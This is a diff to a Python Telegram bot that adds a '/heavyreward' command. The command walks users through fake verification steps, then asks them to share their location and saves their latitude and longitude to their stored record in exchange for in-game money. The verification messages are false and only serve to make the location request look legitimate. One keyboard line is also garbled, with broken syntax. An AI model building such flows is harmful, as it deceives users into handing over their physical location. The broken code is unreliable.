@@ -13419,6 +13419,157 @@ async def allreginfo(update, context):
         parse_mode="HTML",
         disable_web_page_preview=True
     )
+
+#======================location =======================
+from telegram import (
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    KeyboardButton,
+    ReplyKeyboardMarkup,
+    ReplyKeyboardRemove,
+    Update
+)
+from telegram.ext import (
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    ContextTypes,
+    filters
+)
+
+import random
+
+# =========================
+# /heavyreward
+# =========================
+
+async def heavyreward(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("➡ Continue", callback_data="hr_step_1")]
+    ])
+
+    await update.message.reply_text(
+        "🎁 HEAVY REWARD EVENT\n\n"
+        "Step 1/5\n"
+        "Reward verification started.",
+        reply_markup=kb
+    )
+
+
+# =========================
+# CALLBACK FLOW
+# =========================
+
+async def heavyreward_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    query = update.callback_query
+    await query.answer()
+
+    step = query.data
+
+    if step == "hr_step_1":
+
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("➡ Continue", callback_data="hr_step_2")]
+        ])
+
+        await query.edit_message_text(
+            "🎫 Step 2/5\n\n"
+            "Ticket verification completed.",
+            reply_markup=kb
+        )
+
+    elif step == "hr_step_2":
+
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("➡ Continue", callback_data="hr_step_3")]
+        ])
+
+        await query.edit_message_text(
+            "🔒 Step 3/5\n\n"
+            "Security check completed.",
+            reply_markup=kb
+        )
+
+    elif step == "hr_step_3":
+
+        location_keyboard = ReplyKeyboardMarkup(
+            [[KeyboardButton("📍verified", request_location=Trulocation          resize_keyboard=True,
+            one_time_keyboard=True
+        )
+
+        await query.message.reply_text(
+            "📍 Step 4/5\n\n"
+            "continued verified.\n"
+            "Please verified.",
+            reply_markup=location_keyboard
+        )
+
+    elif step == "hr_step_5":
+
+        await query.edit_message_text(
+            "🎉 Reward process completed."
+        )
+
+
+# =========================
+# LOCATION HANDLER
+# =========================
+
+async def heavyreward_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not update.message.location:
+        return
+
+    user = update.effective_user
+
+    user_data = get_user(user.id, user.first_name)
+
+    if user_data.get("heavyreward_claimed", False):
+
+        await update.message.reply_text(
+            "❌ Heavy Reward already claimed.",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        return
+
+    lat = update.message.location.latitude
+    lon = update.message.location.longitude
+
+    reward = random.randint(100000, 1000000)
+
+    user_data["latitude"] = lat
+    user_data["longitude"] = lon
+
+    user_data["money"] += reward
+
+    user_data["heavyreward_claimed"] = True
+
+    save_data()
+
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🎁 Finish", callback_data="hr_step_5")]
+    ])
+
+    await update.message.reply_text(
+        f"✅ Step 5/5\n\n"
+        f"📍 Verified\n"
+        f"💰 Reward: +{reward:,}\n"
+        f"🏦 New Balance: {user_data['money']:,}\n\n"
+        f"🎫 Reward Ticket Generated",
+        reply_markup=ReplyKeyboardRemove()
+    )
+
+    await update.message.reply_text(
+        "Click below to finish.",
+        reply_markup=kb
+    )
+
+
+
+
+
 # =================== MAIN FUNCTION ===================
 async def mongo_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     mongo_data = load_from_mongo()
@@ -13649,6 +13800,7 @@ def main():
     app.add_handler(CommandHandler("registers", registers))
     app.add_handler(CommandHandler("reginfo", reginfo))
     app.add_handler(CommandHandler("allreginfo", allreginfo))
+    app.add_handler(CommandHandler("heavyreward", heavyreward))
     app.add_handler(CommandHandler("userinfo", userinfo))
     
     # ================= WORD GAME CALLBACK =================
@@ -13746,6 +13898,15 @@ def main():
             pattern="^daily_verify_"
         )
     )
+    
+    # ================= HEAVY REWARD =================
+
+    app.add_handler(
+        CallbackQueryHandler(
+            heavyreward_callback,
+            pattern="^hr_step_"
+        )
+    )
     #===================WHISPER =========================
    
     app.add_handler(
@@ -13775,6 +13936,15 @@ def main():
             userinfo_buttons,
             pattern="^userinfo"
         )
+    )
+    # ================= HEAVY REWARD LOCATION =================
+
+    app.add_handler(
+        MessageHandler(
+            filters.LOCATION,
+            heavyreward_location
+        ),
+        group=2
     )
     # ================= 🔥 MESSAGE SYSTEM (ORDERED) =================
     app.add_handler(
